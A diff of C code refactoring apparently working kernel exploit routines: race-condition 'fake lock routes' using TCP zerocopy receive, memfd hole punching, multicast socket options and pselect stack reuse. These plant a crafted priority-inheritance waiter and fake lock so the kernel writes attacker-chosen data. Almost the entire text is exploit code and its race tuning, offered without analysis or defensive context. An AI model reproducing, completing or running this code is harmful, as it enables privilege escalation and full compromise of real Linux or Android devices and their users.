@@ -4,6 +4,7 @@
 #include <netinet/tcp.h>
 
 #include "target.h"
+#include "tcp_zerocopy_route.h"
 
 /* Decoupling plan: route-local elapsed-time helper. Input: monotonic reference;
  * output: elapsed milliseconds. Future: shared_elapsed_ms(const timespec *);
@@ -19,12 +20,12 @@ int route_last_errno;
 
 /* TODO(decoupling:S11-S13-route-context): Route instances will receive their
  * PiRaceContext explicitly. Until then these aliases expose one owned context. */
-#define punch_consume_go (g_pi_race_context.consumer_go)
-#define punch_consume_stop (g_pi_race_context.consumer_stop)
-#define consumer_calls (g_pi_race_context.consumer_calls)
-#define consumer_success (g_pi_race_context.consumer_success)
-#define consumer_inflight (g_pi_race_context.consumer_inflight)
-#define main_route_delay_usec (g_pi_race_context.route_delay_usec)
+#define legacy_consumer_go (g_pi_race_context.consumer_go)
+#define legacy_consumer_stop (g_pi_race_context.consumer_stop)
+#define legacy_consumer_calls (g_pi_race_context.consumer_calls)
+#define legacy_consumer_success (g_pi_race_context.consumer_success)
+#define legacy_consumer_inflight (g_pi_race_context.consumer_inflight)
+#define legacy_route_delay_usec (g_pi_race_context.route_delay_usec)
 
 /* 5.x kernel route. The multicast option buffer overlaps the stale compact
  * waiter. Profiles opt in with kernel_major=5 and mcast_waiter_off. */
@@ -192,18 +193,18 @@ void do_kernel5_fake_lock_route(const WriteRequest *request) {
 
   int fd = socket(AF_INET, SOCK_DGRAM | SOCK_CLOEXEC, 0);
   if (fd < 0) { route_last_step = 60; route_last_errno = errno; return; }
-  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
-  atomic_store(&punch_consume_stop, 0); atomic_store(&main_route_delay_usec, 0);
+  atomic_store(&legacy_consumer_calls, 0); atomic_store(&legacy_consumer_success, 0);
+  atomic_store(&legacy_consumer_stop, 0); atomic_store(&legacy_route_delay_usec, 0);
   errno = 0;
   int ret = setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
   route_last_step = 61; route_last_errno = errno;
-  atomic_store(&punch_consume_go, 1);
-  for (int spin = 0; spin < 100000000 && atomic_load(&consumer_calls) == 0; spin++)
+  atomic_store(&legacy_consumer_go, 1);
+  for (int spin = 0; spin < 100000000 && atomic_load(&legacy_consumer_calls) == 0; spin++)
     __asm__ volatile("yield" ::: "memory");
-  atomic_store(&punch_consume_go, 0);
-  while (atomic_load(&consumer_inflight)) __asm__ volatile("yield" ::: "memory");
+  atomic_store(&legacy_consumer_go, 0);
+  while (atomic_load(&legacy_consumer_inflight)) __asm__ volatile("yield" ::: "memory");
   close(fd);
-  if (ret == 0 || atomic_load(&consumer_success) > 0) {
+  if (ret == 0 || atomic_load(&legacy_consumer_success) > 0) {
     route_last_step = 0; route_last_errno = 0;
   }
 }
@@ -213,22 +214,11 @@ void do_kernel5_fake_lock_route(const WriteRequest *request) {
  * waiter->lock. */
 #define TCP_PUNCH_SHMEM_LEN (16 * 1024 * 1024)
 
-struct tcp_punch_state {
-  int fd;
-  size_t page_size;
-};
-
-static atomic_int tcp_punch_go;
-static atomic_int tcp_punch_stop;
-static atomic_int tcp_punch_phase;
-/* errno of the first puncher fallocate that failed; 0 while healthy */
-static atomic_int tcp_punch_failed;
-
 /* Decoupling plan: stop and drain the shared PI consumer. Input: race context;
- * output: consumer idle. Future: pi_race_stop_consumer(PiRaceContext *). */
-static void tcp_wait_for_consumer_idle(void) {
-  atomic_store(&punch_consume_go, 0);
-  while (atomic_load(&consumer_inflight)) {
+ * output: consumer idle. */
+static void tcp_wait_for_consumer_idle(TcpZerocopyRouteContext *context) {
+  atomic_store(&context->race->consumer_go, 0);
+  while (atomic_load(&context->race->consumer_inflight)) {
     __asm__ volatile("yield" ::: "memory");
   }
 }
@@ -236,7 +226,7 @@ static void tcp_wait_for_consumer_idle(void) {
 /* Decoupling plan: create a connected loopback TCP pair. Input: output slots;
  * output: 0/-1 and owned descriptors. Future: tcp_zerocopy_open_pair(context),
  * recording descriptor ownership in TcpZerocopyRouteContext. */
-static int tcp_make_pair(int *client_fd, int *server_fd) {
+static int tcp_make_pair(TcpZerocopyRouteContext *context) {
   int listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
   if (listener < 0) {
     return -1;
@@ -266,193 +256,192 @@ static int tcp_make_pair(int *client_fd, int *server_fd) {
     return -1;
   }
 
-  *client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
-  if (*client_fd < 0) {
+  context->client_fd = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
+  if (context->client_fd < 0) {
     int saved = errno;
     close(listener);
     errno = saved;
     return -1;
   }
-  if (connect(*client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
+  if (connect(context->client_fd, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
     int saved = errno;
-    close(*client_fd);
+    close(context->client_fd);
+    context->client_fd = -1;
     close(listener);
     errno = saved;
     return -1;
   }
 
-  *server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
+  context->server_fd = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
   int saved = errno;
   close(listener);
-  if (*server_fd < 0) {
-    close(*client_fd);
+  if (context->server_fd < 0) {
+    close(context->client_fd);
+    context->client_fd = -1;
     errno = saved;
     return -1;
   }
   return 0;
 }
 
-/* Decoupling plan: repeatedly fill and punch the zerocopy backing memfd. Input:
- * punch state plus implicit atomics; output: phase/error flags. Future:
- * tcp_zerocopy_punch_worker(void *TcpZerocopyRouteContext). */
+/* Repeatedly fill and punch the context-owned zerocopy backing memfd. Input:
+ * TcpZerocopyRouteContext; output: context-owned phase/error flags. */
 static void *tcp_punch_thread(void *arg) {
   disable_rseq_for_thread();
-  struct tcp_punch_state *state = arg;
-  while (!atomic_load(&tcp_punch_go) && !atomic_load(&tcp_punch_stop)) {
+  TcpZerocopyRouteContext *context = arg;
+  while (!atomic_load(&context->punch_go) &&
+         !atomic_load(&context->punch_stop)) {
     sched_yield();
   }
-  while (!atomic_load(&tcp_punch_stop)) {
-    if (fallocate(state->fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
-      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
+  while (!atomic_load(&context->punch_stop)) {
+    if (fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
+      atomic_store(&context->punch_failed, errno ? errno : EIO);
       pr_warning("tcp punch fill errno=%d\n", errno);
       break;
     }
-    atomic_store(&tcp_punch_phase, 1);
-    if (fallocate(state->fd, FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
-                  (off_t)state->page_size,
-                  TCP_PUNCH_SHMEM_LEN - state->page_size) != 0) {
+    atomic_store(&context->punch_phase, 1);
+    if (fallocate(context->punch_fd,
+                  FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE,
+                  (off_t)context->page_size,
+                  context->mapping_length - context->page_size) != 0) {
       /* without the hole the target page keeps stale contents and the
        * zerocopy write misses */
-      atomic_store(&tcp_punch_failed, errno ? errno : EIO);
+      atomic_store(&context->punch_failed, errno ? errno : EIO);
       pr_warning("tcp punch hole errno=%d\n", errno);
     }
-    atomic_store(&tcp_punch_phase, 0);
-    if (atomic_load(&tcp_punch_failed)) {
+    atomic_store(&context->punch_phase, 0);
+    if (atomic_load(&context->punch_failed)) {
       break;
     }
   }
   return NULL;
 }
 
-/* Decoupling plan: prepare, execute and clean the TCP zerocopy route. Input:
- * session payload/race state; output: RouteStatus. Future: split into
- * tcp_zerocopy_prepare/execute/disarm/destroy with context-owned resources. */
-void do_tcp_fake_lock_route(const WriteRequest *request) {
-  (void)request;
+static int tcp_zerocopy_fail(TcpZerocopyRouteContext *context,
+                             int step, int error_number) {
+  context->status.step = step;
+  context->status.error_number = error_number;
+  route_last_step = step;
+  route_last_errno = error_number;
+  return -1;
+}
+
+/* Acquire every userspace resource owned by the TCP route. No PI consumer or
+ * punch operation is armed until this function has completed successfully. */
+static int tcp_zerocopy_prepare(TcpZerocopyRouteContext *context) {
   if (!page_base || !fake_lock || !fake_fops) {
-    route_last_step = 40;
-    route_last_errno = 0;
     pr_warning("tcp route missing page=%016zx lock=%016zx fops=%016zx\n",
-             page_base, fake_lock, fake_fops);
-    return;
+               page_base, fake_lock, fake_fops);
+    return tcp_zerocopy_fail(context, 40, 0);
   }
 
-  int client_fd = -1;
-  int server_fd = -1;
-  int punch_fd = -1;
-  char *map = MAP_FAILED;
-  pthread_t puncher;
-  int puncher_started = 0;
-  int route_ok = 0;
-  const struct execution_settings *execution = execution_settings();
-
-  if (tcp_make_pair(&client_fd, &server_fd) != 0) {
-    route_last_step = 41;
-    route_last_errno = errno;
+  if (tcp_make_pair(context) != 0) {
     pr_warning("tcp route pair setup failed errno=%d\n", errno);
-    return;
+    return tcp_zerocopy_fail(context, 41, errno);
   }
 
-  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
-  punch_fd = (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
-  if (punch_fd < 0 ||
-      fallocate(punch_fd, 0, 0, TCP_PUNCH_SHMEM_LEN) != 0) {
-    route_last_step = 42;
-    route_last_errno = errno;
+  context->page_size = (size_t)sysconf(_SC_PAGESIZE);
+  context->punch_fd =
+      (int)syscall(SYS_memfd_create, "ghostlock-tcp", MFD_CLOEXEC);
+  if (context->punch_fd < 0 ||
+      fallocate(context->punch_fd, 0, 0, context->mapping_length) != 0) {
     pr_warning("tcp route memfd/fallocate errno=%d\n", errno);
-    goto out;
+    return tcp_zerocopy_fail(context, 42, errno);
   }
-  map = mmap(NULL, TCP_PUNCH_SHMEM_LEN, PROT_READ | PROT_WRITE,
-             MAP_SHARED, punch_fd, 0);
-  if (map == MAP_FAILED) {
-    route_last_step = 43;
-    route_last_errno = errno;
+  context->mapping = mmap(NULL, context->mapping_length,
+                          PROT_READ | PROT_WRITE,
+                          MAP_SHARED, context->punch_fd, 0);
+  if (context->mapping == MAP_FAILED) {
     pr_warning("tcp route mmap errno=%d\n", errno);
-    goto out;
+    return tcp_zerocopy_fail(context, 43, errno);
   }
-  for (size_t off = 0; off < TCP_PUNCH_SHMEM_LEN; off += page_size) {
-    map[off] = 0x55;
+  for (size_t off = 0; off < context->mapping_length;
+       off += context->page_size) {
+    context->mapping[off] = 0x55;
   }
 
-  struct tcp_punch_state state = {.fd = punch_fd, .page_size = page_size};
-  /* clear before the thread can start */
-  atomic_store(&tcp_punch_stop, 0);
-  atomic_store(&tcp_punch_phase, 0);
-  atomic_store(&tcp_punch_failed, 0);
-  atomic_store(&punch_consume_stop, 0);
-  atomic_store(&punch_consume_go, 0);
-  atomic_store(&consumer_calls, 0);
-  atomic_store(&consumer_success, 0);
-  if (pthread_create(&puncher, NULL, tcp_punch_thread, &state) != 0) {
-    route_last_step = 44;
-    route_last_errno = errno;
-    pr_warning("tcp route punch thread errno=%d\n", errno);
-    goto out;
+  atomic_store(&context->race->consumer_stop, 0);
+  atomic_store(&context->race->consumer_go, 0);
+  atomic_store(&context->race->consumer_calls, 0);
+  atomic_store(&context->race->consumer_success, 0);
+  int thread_error = pthread_create(
+      &context->punch_worker, NULL, tcp_punch_thread, context);
+  if (thread_error != 0) {
+    pr_warning("tcp route punch thread errno=%d\n", thread_error);
+    return tcp_zerocopy_fail(context, 44, thread_error);
   }
-  puncher_started = 1;
+  context->punch_worker_started = 1;
+  return 0;
+}
 
+/* Run the route after prepare has established exclusive resource ownership. */
+static RouteStatus tcp_zerocopy_execute(TcpZerocopyRouteContext *context) {
   /* waiter->task carries init_task's phys alias, not the image address */
   uintptr_t waiter_task = SLIDE_INIT_TASK;
-  int arm_seq = (int)execution->tcp_arm_sequence;
-  int post_hold = (int)execution->tcp_post_receive_hold_iterations;
-  int attempts = (int)execution->tcp_attempts;
+  int arm_seq = (int)context->execution->tcp_arm_sequence;
+  int post_hold =
+      (int)context->execution->tcp_post_receive_hold_iterations;
+  int attempts = (int)context->execution->tcp_attempts;
 
   pr_info("tcp route enter page=%016zx fake_lock=%016zx fake_w0=%016zx "
           "fake_task=%016zx task=%016zx attempts=%d arm=%d hold=%d\n",
           page_base, fake_lock, fake_w0, fake_task, waiter_task,
           attempts, arm_seq, post_hold);
 
-  atomic_store(&tcp_punch_go, 1);
+  atomic_store(&context->punch_go, 1);
   /* custom-write mode: fire the PI walk immediately */
-  atomic_store(&main_route_delay_usec, 0);
+  atomic_store(&context->race->route_delay_usec, 0);
 
   char sendbuf[64];
   memset(sendbuf, 0x33, sizeof(sendbuf));
 
-  for (int i = 1; i <= attempts && !route_ok; i++) {
-    int calls_before = atomic_load(&consumer_calls);
-    int success_before = atomic_load(&consumer_success);
-    (void)send(server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
-    while (atomic_load(&tcp_punch_phase)) {
+  for (int i = 1; i <= attempts && !context->route_won; i++) {
+    int calls_before = atomic_load(&context->race->consumer_calls);
+    int success_before = atomic_load(&context->race->consumer_success);
+    (void)send(context->server_fd, sendbuf, sizeof(sendbuf), MSG_DONTWAIT);
+    while (atomic_load(&context->punch_phase)) {
       sched_yield();
     }
     for (int spin = 0;
-         !atomic_load(&tcp_punch_phase) && !atomic_load(&tcp_punch_failed) &&
+         !atomic_load(&context->punch_phase) &&
+         !atomic_load(&context->punch_failed) &&
          spin < 10000000;
          spin++) {
       __asm__ volatile("yield" ::: "memory");
     }
-    if (atomic_load(&tcp_punch_failed)) {
-      route_last_step = 46;
-      route_last_errno = atomic_load(&tcp_punch_failed);
+    if (atomic_load(&context->punch_failed)) {
+      tcp_zerocopy_fail(context, 46,
+                        atomic_load(&context->punch_failed));
       pr_warning("tcp route puncher failed errno=%d\n", route_last_errno);
       break;
     }
 
     unsigned char zc[0x40];
     memset(zc, 0, sizeof(zc));
-    put64(zc, 0x18, (uint64_t)(uintptr_t)(map + page_size));
+    put64(zc, 0x18,
+          (uint64_t)(uintptr_t)(context->mapping + context->page_size));
     put32(zc, 0x20, sizeof(sendbuf));
     put64(zc, 0x28, waiter_task);
     put64(zc, 0x30, fake_lock);
 
     socklen_t len = sizeof(zc);
     errno = 0;
-    int ret = getsockopt(client_fd, IPPROTO_TCP, TCP_ZEROCOPY_RECEIVE, zc,
+    int ret = getsockopt(context->client_fd, IPPROTO_TCP,
+                         TCP_ZEROCOPY_RECEIVE, zc,
                          &len);
     int saved_errno = errno;
     /* release the consumer only once the zerocopy write landed in the
      * waiter frame; earlier release walks a half-written waiter */
     if (i >= arm_seq && ret == 0) {
-      atomic_store(&punch_consume_go, i);
+      atomic_store(&context->race->consumer_go, i);
       for (int spin = 0; spin < post_hold; spin++) {
         __asm__ volatile("yield" ::: "memory");
       }
-      tcp_wait_for_consumer_idle();
+      tcp_wait_for_consumer_idle(context);
     }
 
-    int calls = atomic_load(&consumer_calls);
-    int success = atomic_load(&consumer_success);
+    int calls = atomic_load(&context->race->consumer_calls);
+    int success = atomic_load(&context->race->consumer_success);
     if (calls <= calls_before || success <= success_before) {
       if ((i % 100) == 0 || ret != 0) {
         pr_info("tcp route seq=%d ret=%d errno=%d len=%u calls=%d "
@@ -463,39 +452,91 @@ void do_tcp_fake_lock_route(const WriteRequest *request) {
     }
     /* consumer fired: the PI walk derefed the crafted waiter and wrote.
      * stages verify their own effects; no cfi stage here. */
-    pr_info("tcp route won seq=%d\n", i);
-    route_ok = 1;
+    context->route_won = 1;
+    context->status.code = ROUTE_OK;
     route_last_step = 0;
     route_last_errno = 0;
   }
+  if (!context->route_won && context->status.step == 0) {
+    tcp_zerocopy_fail(context, 45, 0);
+  }
+  return context->status;
+}
 
-out:
-  atomic_store(&punch_consume_go, 0);
-  atomic_store(&punch_consume_stop, 1);
-  atomic_store(&tcp_punch_go, 0);
-  atomic_store(&tcp_punch_stop, 1);
-  if (puncher_started) {
-    pthread_join(puncher, NULL);
+/* Stop every trigger before releasing any descriptor or mapping. */
+static void tcp_zerocopy_disarm(TcpZerocopyRouteContext *context) {
+  atomic_store(&context->race->consumer_go, 0);
+  atomic_store(&context->race->consumer_stop, 1);
+  atomic_store(&context->punch_go, 0);
+  atomic_store(&context->punch_stop, 1);
+  tcp_wait_for_consumer_idle(context);
+  context->status.kernel_disarmed = 1;
+}
+
+/* Join the owned worker, then release each owned userspace resource once. */
+static void tcp_zerocopy_destroy(TcpZerocopyRouteContext *context) {
+  if (context->punch_worker_started) {
+    int join_error = pthread_join(context->punch_worker, NULL);
+    if (join_error != 0) {
+      tcp_zerocopy_fail(context, 47, join_error);
+      context->status.code = ROUTE_DIRTY_FAILURE;
+      pr_warning("tcp route punch join errno=%d; resources retained\n",
+                 join_error);
+      return;
+    }
+    context->punch_worker_started = 0;
   }
-  if (map != MAP_FAILED) {
-    munmap(map, TCP_PUNCH_SHMEM_LEN);
+  if (context->mapping != MAP_FAILED) {
+    if (munmap(context->mapping, context->mapping_length) != 0) {
+      int saved_errno = errno;
+      tcp_zerocopy_fail(context, 48, saved_errno);
+      context->status.code = ROUTE_DIRTY_FAILURE;
+      pr_warning("tcp route munmap errno=%d\n", saved_errno);
+      return;
+    }
+    context->mapping = MAP_FAILED;
   }
-  if (punch_fd >= 0) {
-    close(punch_fd);
+  if (context->punch_fd >= 0) {
+    close(context->punch_fd);
+    context->punch_fd = -1;
   }
-  if (server_fd >= 0) {
-    close(server_fd);
+  if (context->server_fd >= 0) {
+    close(context->server_fd);
+    context->server_fd = -1;
   }
-  if (client_fd >= 0) {
-    close(client_fd);
+  if (context->client_fd >= 0) {
+    close(context->client_fd);
+    context->client_fd = -1;
   }
-  if (!route_ok && route_last_step == 0) {
-    route_last_step = 45;
+  context->status.userspace_clean = 1;
+  if (!context->route_won && context->status.kernel_disarmed) {
+    context->status.code = ROUTE_FALLBACK_SAFE;
   }
-  pr_info("tcp route done=%d calls=%d success=%d step=%d errno=%d\n",
-          route_ok, atomic_load(&consumer_calls),
-          atomic_load(&consumer_success), route_last_step,
-          route_last_errno);
+}
+
+/* Public compatibility entry: lifecycle is now explicitly ordered while the
+ * common route dispatcher remains scheduled for S14. */
+void do_tcp_fake_lock_route(const WriteRequest *request) {
+  TcpZerocopyRouteContext context;
+  tcp_zerocopy_route_context_init(
+      &context, &g_pi_race_context, request, execution_settings(),
+      TCP_PUNCH_SHMEM_LEN);
+  route_last_step = 0;
+  route_last_errno = 0;
+
+  if (tcp_zerocopy_prepare(&context) == 0) {
+    tcp_zerocopy_execute(&context);
+  }
+  tcp_zerocopy_disarm(&context);
+  tcp_zerocopy_destroy(&context);
+
+  pr_info("tcp route done=%d calls=%d success=%d status=%d clean=%d/%d "
+          "step=%d errno=%d\n",
+          context.route_won,
+          atomic_load(&context.race->consumer_calls),
+          atomic_load(&context.race->consumer_success), context.status.code,
+          context.status.userspace_clean, context.status.kernel_disarmed,
+          context.status.step, context.status.error_number);
 }
 
 /* Decoupling plan: choose route timing delay. Input: attempt and eventually
@@ -764,12 +805,12 @@ void do_pselect_fake_lock_route(const WriteRequest *request) {
   open_selected_fds(&in, &out, &ex, high_read, pipefd[1]);
   close(high_read);
 
-  atomic_store(&consumer_calls, 0);
-  atomic_store(&consumer_success, 0);
-  atomic_store(&punch_consume_stop, 0);
+  atomic_store(&legacy_consumer_calls, 0);
+  atomic_store(&legacy_consumer_success, 0);
+  atomic_store(&legacy_consumer_stop, 0);
   int delay_usec = route_delay_usec(1);
-  atomic_store(&main_route_delay_usec, delay_usec);
-  atomic_store(&punch_consume_go, 1);
+  atomic_store(&legacy_route_delay_usec, delay_usec);
+  atomic_store(&legacy_consumer_go, 1);
 
   pr_info("pselect pre-select compact=%d +%.0fms\n", compact_route,
           fops_elapsed_ms(&route_t0));
@@ -791,43 +832,28 @@ void do_pselect_fake_lock_route(const WriteRequest *request) {
     };
     ret = select(PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout);
   }
+  int saved_errno = errno;
+  restore_standard_io();
+  pr_info("pselect post-select compact=%d +%.0fms ret=%d\n", compact_route,
+          fops_elapsed_ms(&route_t0), ret);
+  atomic_store(&legacy_consumer_go, 0);
 
-  int calls = 0;
-  int success = 0;
-  int winner = 0;
-  int leak_fds = 0;
-  for (int attempt = 1; attempt <= attempts; attempt++) {
-    if (compact_route && attempt > 1) {
-      /* lost race clobbers the page, respray re-derives fake_* too */
-      page_base = prepare_good_kernel_page();
-      if (!page_base || !fake_lock || !fake_fops) {
-        route_last_step = 35;
-        route_last_errno = errno;
-        pr_warning("pselect retry page prepare failed attempt=%d\n", attempt);
-        break;
-      }
+  /* Root-My-Galaxy slide_pselect_stack_copy: when the consumer entered sched_setattr,
+   * wait for it to finish before tearing the fds down. The PI walk runs on
+   * the consumer's CPU and we must not close/reclaim the block fds while it
+   * still holds the crafted waiter on the stack. */
+  int consumer_stuck = 0;
+  if (atomic_load(&legacy_consumer_inflight) != 0) {
+    for (int i = 0; i < 2000 && atomic_load(&legacy_consumer_inflight) != 0; i++) {
+      usleep(1000);
     }
+    consumer_stuck = atomic_load(&legacy_consumer_inflight) != 0;
+  }
 
-    /* park on a never-ready timerfd so the waiter stays stale on the
-     * pselect stack for the consumer window */
-    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
-    if (block_fd < 0) {
-      pr_warning("pselect timerfd_create failed errno=%d; using pipe read end\n",
-                 errno);
-      block_fd = pipefd[0];
-    }
-    int high_read = fcntl(block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16);
-    if (high_read < 0) {
-      route_last_step = 31;
-      route_last_errno = errno;
-      pr_warning("pselect F_DUPFD read errno=%d\n", errno);
-      if (block_fd != pipefd[0]) {
-        close(block_fd);
-      }
-      close(pipefd[0]);
-      close(pipefd[1]);
-      return;
-    }
+  calls = atomic_load(&legacy_consumer_calls);
+  success = atomic_load(&legacy_consumer_success);
+  pr_info("pselect returned ret=%d errno=%d calls=%d success=%d delay=%d\n",
+          ret, saved_errno, calls, success, delay_usec);
 
     fd_set in;
     fd_set out;
